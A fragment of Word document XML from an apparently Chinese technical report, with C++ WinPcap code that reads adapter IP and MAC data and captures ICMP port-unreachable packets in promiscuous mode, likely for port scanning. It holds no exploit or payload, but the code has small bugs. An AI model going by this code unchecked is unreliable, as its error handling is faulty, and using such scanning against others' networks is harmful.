    <w:p w14:paraId="0FF8A963" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="412E2E72" w14:textId="44BECA0B" w:rsidR="0061401E" w:rsidRPr="002A4306" w:rsidRDefault="0061401E" w:rsidP="005D4972">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23B8A99A" w14:textId="515EB0F5"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1115" w:name="_Toc482141258"/>
      <w:bookmarkStart w:id="1116" w:name="_Toc482141931"/>
      <w:bookmarkStart w:id="1117" w:name="_Toc482522652"/>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>网卡信息获取</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1115"/>
      <w:bookmarkEnd w:id="1116"/>
      <w:bookmarkEnd w:id="1117"/>
    </w:p>
    <w:p w14:paraId="7E4F38C8" w14:textId="0896BC2B" w:rsidR="0061401E" w:rsidRPr="00E66CA6" w:rsidRDefault="00E66CA6" w:rsidP="00AF0B42">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:firstLine="4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40424791" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:t>DeviceInfo GetAdapterInfo(pcap_if_t* Device)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49C069B4" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75A40B09" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>DeviceInfo DevInfo;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="314840A5" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>ZeroMemory(&amp;DevInfo, sizeof(DevInfo));</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BE4D4D4" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="54C5AF84" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>IP_ADAPTER_INFO* AdapterInfo = new IP_ADAPTER_INFO[48];</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EEB4760" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>ULONG AIS = sizeof(IP_ADAPTER_INFO)* 48;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="631E0158" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="11267426" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>GetAdaptersInfo(AdapterInfo, &amp;AIS);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B428DDB" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1348B8F1" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:tab/>
        <w:t>for (IP_ADAPTER_INFO* Current = AdapterInfo; Current != NULL; Current = Current-&gt;Next)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67EBB9BC" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59414660" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>if (strstr(Device-&gt;name, Current-&gt;AdapterName) != 0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3835ABFD" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7E13DDF3" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B36B9B3" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>cout &lt;&lt; Device-&gt;addresses-&gt;addr-&gt;sa_data &lt;&lt; endl;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D7EDCC5" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>DevInfo.IP = BytesTo32(Device-&gt;addresses-&gt;addr-&gt;sa_data[2], Device-&gt;addresses-&gt;addr-&gt;sa_data[3],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66E85C1D" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>Device-&gt;addresses-&gt;addr-&gt;sa_data[4], Device-&gt;addresses-&gt;addr-&gt;sa_data[5]);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B22A99C" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7BD1C725" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>DevInfo.DefaultGateway = inet_addr(Current-&gt;GatewayList.IpAddress.String);</w:t>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>// DevInfo.DefaultGateway</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39D1D1D9" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="416C51F7" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>DevInfo.IP = inet_addr(Current-&gt;IpAddressList.IpAddress.String); //DevInfo.IP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73914C4A" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="2828B1BD" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>memcpy((void*)DevInfo.PhysicalAddress, (void*)(Current-&gt;Address), 6); //DevInfo.PhysicalAddress</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C376711" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>ULONG MACSize = 6;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3479D4FD" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>DevInfo.Exists = true;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40ECB145" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>return DevInfo;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53598938" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CF20B6D" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CAD2585" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>DevInfo.Exists = false;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79853FBF" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>return DevInfo;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12FEAD44" w14:textId="6EF96934" w:rsidR="0061401E" w:rsidRPr="00A304EC" w:rsidRDefault="0061401E" w:rsidP="003A1CC2">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F49CD23" w14:textId="192019D7" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="5115"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:firstLine="0"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="1118" w:name="_Toc482141259"/>
      <w:bookmarkStart w:id="1119" w:name="_Toc482141932"/>
      <w:bookmarkStart w:id="1120" w:name="_Toc482522653"/>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>数据包的捕获</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1118"/>
      <w:bookmarkEnd w:id="1119"/>
      <w:bookmarkEnd w:id="1120"/>
    </w:p>
    <w:p w14:paraId="11CF6D6B" w14:textId="77777777" w:rsidR="002F48B8" w:rsidRDefault="002F48B8" w:rsidP="002F48B8">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5DA55725" w14:textId="77777777" w:rsidR="002F48B8" w:rsidRDefault="002F48B8" w:rsidP="002F48B8">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w:t>
      </w:r>
      <w:r w:rsidRPr="00A53D57">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>给应用程序。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>到此，完成捕获条件设置</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="025EC27C" w14:textId="0BB467E8" w:rsidR="002F48B8" w:rsidRPr="002F48B8" w:rsidRDefault="002F48B8" w:rsidP="002F48B8">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5D4FA3D6" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="40" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:t>DWORD WINAPI getICMP(LPVOID lpParameter)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="534D26B4" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="40" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51D298B0" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="40" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>ThreadICMP* Device = (ThreadICMP*)lpParameter;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="173874DA" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="40" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>pcap_if_t *device = Device-&gt;device;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BE78BA9" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="40" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>//int inum;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CE5C2A3" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="40" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>int i = 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0568C4F4" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="40" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>pcap_t *adhandle;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F588109" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="40" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>char errbuf[PCAP_ERRBUF_SIZE];</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="215AF92F" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="40" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>u_int netmask;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A163B6B" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="40" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>char packet_filter[] = "icmp[icmptype] == icmp-unreach";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01F24C52" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="40" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>struct bpf_program fcode;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47668E1A" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="40" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>/* Open the adapter */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44664AA6" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="40" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>/*lpParameter-&gt;device*/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="234A8C90" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="40" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>if ((adhandle = pcap_open(device-&gt;name,  // name of the device</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DFF2402" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="40" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve">65536,     // portion of the packet to capture. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40156DAB" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="40" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>// 65536 grants that the whole packet will be captured on all the MACs.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="111D063A" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="40" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>PCAP_OPENFLAG_PROMISCUOUS,         // promiscuous mode</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21848F07" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="40" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>1000,      // read timeout</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="756FBC9B" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="40" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>NULL,      // remote authentication</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AA387EF" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="40" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>errbuf     // error buffer</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EA2BEF4" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="40" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>)) == NULL)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54847C64" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="40" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79A4FBCA" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="40" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>fprintf(stderr, "\nUnable to open the adapter. %s is not supported by WinPcap\n");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="495C7110" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="40" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A6A563D" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="40" w:lineRule="atLeast"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5C7B63C9" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="40" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>/* Check the link layer. We support only Ethernet for simplicity. */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04AFF927" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="40" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>if (pcap_datalink(adhandle) != DLT_EN10MB)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DF60C8E" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="40" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="134C970E" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="40" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>fprintf(stderr, "\nThis program works only on Ethernet networks.\n");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C4BA41D" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="40" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CE3D6EE" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="40" w:lineRule="atLeast"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4BB965F7" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="40" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>if (device-&gt;addresses != NULL)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2289982A" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="40" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>/* Retrieve the mask of the first address of the interface */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="139F3829" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="40" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>netmask = ((struct sockaddr_in *)(device-&gt;addresses-&gt;netmask))-&gt;sin_addr.S_un.S_addr;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E3A3983" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="40" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>else</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ABD2E67" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="40" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
